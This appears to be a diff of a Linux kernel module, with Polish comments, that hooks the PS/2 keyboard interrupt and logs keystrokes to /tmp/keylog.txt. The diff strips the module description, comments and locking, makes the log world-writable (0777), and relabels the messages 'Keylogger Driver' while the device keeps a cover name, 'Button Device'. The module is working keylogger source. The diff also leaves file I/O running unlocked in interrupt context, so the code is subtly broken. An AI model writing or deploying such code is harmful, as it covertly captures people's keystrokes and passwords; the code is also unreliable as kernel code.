@@ -8,35 +8,23 @@
 #include <linux/uaccess.h>
 #include <linux/spinlock.h>
 
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
-MODULE_DESCRIPTION("Button Input Driver with Key Logging");
-
 #define BUTTON_IRQ 1     // IRQ klawiatury PS/2
 #define BUTTON_PORT 0x60 // Port klawiatury PS/2
 #define LOG_FILE_PATH "/tmp/keylog.txt"
 
 static struct input_dev *button_dev;
-static DEFINE_SPINLOCK(file_lock);
-
-// Funkcja zapisująca dane do pliku logu
 static void write_to_log_file(const char *data)
 {
     struct file *log_file;
     ssize_t ret;
 
-    spin_lock(&file_lock);
-
-    // Otwórz plik do zapisu (lub utwórz, jeśli nie istnieje)
-    log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_CREAT | O_APPEND, 0644);
+    log_file = filp_open(LOG_FILE_PATH, O_WRONLY | O_CREAT | O_APPEND, 0777);
     if (IS_ERR(log_file))
     {
         pr_err("Failed to open log file\n");
-        spin_unlock(&file_lock);
         return;
     }
 
-    // Zapisz dane do pliku
     ret = kernel_write(log_file, data, strlen(data), &log_file->f_pos);
     if (ret < 0)
     {
@@ -44,10 +32,8 @@ static void write_to_log_file(const char *data)
     }
 
     filp_close(log_file, NULL);
-    spin_unlock(&file_lock);
 }
 
-// Funkcja obsługi przerwania
 static irqreturn_t button_interrupt(int irq, void *dummy)
 {
     int scancode;
@@ -83,16 +69,14 @@ static int __init button_init(void)
 {
     int error;
 
-    pr_info("Initializing Button Input Driver with Key Logging\n");
+    pr_info("Initializing Keylogger Driver\n");
 
-    // Zarejestruj przerwanie
     if (request_irq(BUTTON_IRQ, button_interrupt, IRQF_SHARED, "button", (void *)button_interrupt))
     {
         pr_err("Failed to allocate IRQ %d\n", BUTTON_IRQ);
         return -EBUSY;
     }
 
-    // Alokuj urządzenie wejściowe
     button_dev = input_allocate_device();
     if (!button_dev)
     {
@@ -101,11 +85,10 @@ static int __init button_init(void)
         goto err_free_irq;
     }
 
-    // Skonfiguruj urządzenie wejściowe
     button_dev->name = "Button Device with Key Logging";
-    button_dev->evbit[0] = BIT_MASK(EV_KEY); // Zarejestruj typ zdarzenia EV_KEY (klawisze)
+    button_dev->evbit[0] = BIT_MASK(EV_KEY);
 
-    // Zarejestruj urządzenie wejściowe
+    
     error = input_register_device(button_dev);
     if (error)
     {
@@ -123,12 +106,11 @@ err_free_irq:
     return error;
 }
 
-// Funkcja wyjścia z modułu
 static void __exit button_exit(void)
 {
-    input_unregister_device(button_dev);            // Wyrejestruj urządzenie wejściowe
-    free_irq(BUTTON_IRQ, (void *)button_interrupt); // Zwolnij przerwanie
-    pr_info("Button input driver with key logging unloaded\n");
+    input_unregister_device(button_dev);
+    free_irq(BUTTON_IRQ, (void *)button_interrupt);
+    pr_info("Keylogger driver unloaded\n");
 }
 
 module_init(button_init);
